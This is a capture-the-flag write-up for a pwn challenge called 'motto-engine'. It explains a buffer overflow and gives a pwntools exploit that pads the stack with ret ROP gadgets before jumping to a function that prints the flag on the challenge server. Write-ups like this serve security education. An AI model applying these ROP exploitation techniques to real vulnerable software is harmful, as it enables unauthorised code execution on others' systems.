# pwn-3: motto-engine

<img src="images/pwn-3.jpg"></img>

## Prompt 

The **Ministry** is always on the lookout for new mottos. The **Ministry of Truth** provides you the attached linux binary to exploit. It is also running on a remote server where it protects the truth in a file called flag.txt. Capture the flag from the remote server. Big brother grants you the following code to connect to the remote server.

```python
from pwn import * 
p=remote("bigbrother-pwn-3.chals.io", 443, ssl=True, sni="bigbrother-pwn-3.chals.io")
p.interactive()
```

## Solution

This program suffers a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow). Instead of finding the exact offset of the overflow, we can use a trick to pad the stack with ``ret`` ROP gadgets that will just return to the stack if executed. 

We can can find the ret gadget using [ropper](https://github.com/sashs/Ropper). 

```
ropper -f ./chal.bin
...
0x0000000000401016: ret;
```

We can then write a script to send the ``ret`` gadgets followed by the address of the ``freedom()`` function that displays the flag. 

```python
from pwn import *

p=remote("bigbrother-pwn-3.chals.io", 443, ssl=True, sni="bigbrother-pwn-3.chals.io")

ret     = 0x401016 
freedom = 0x40145d
 
chain = p64(ret)*11
chain += p64(freedom)

p.sendlineafter(b'>>>',chain)

p.interactive()

```
